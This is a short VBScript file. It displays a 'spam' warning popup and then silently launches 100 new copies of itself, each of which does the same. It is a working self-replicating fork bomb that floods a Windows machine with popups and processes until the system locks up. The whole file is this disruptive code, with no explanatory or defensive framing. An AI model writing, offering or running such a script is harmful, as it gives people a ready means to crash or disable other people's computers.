' Create a Shell object
Set shell = CreateObject("WScript.Shell")

' Function to display a popup
Sub ShowPopup()
    MsgBox "Warning: This is a spam popup!", vbCritical, "Spam Alert"
End Sub

' Function to start a new instance of the script
Sub StartNewInstances()
    Dim i
    For i = 1 To 100 ' Adjust the number as needed
        shell.Run "wscript """ & WScript.ScriptFullName & """", 0, False
    Next
End Sub

' Display the popup
ShowPopup()

' Start new instances
StartNewInstances()

' Clean up
Set shell = Nothing
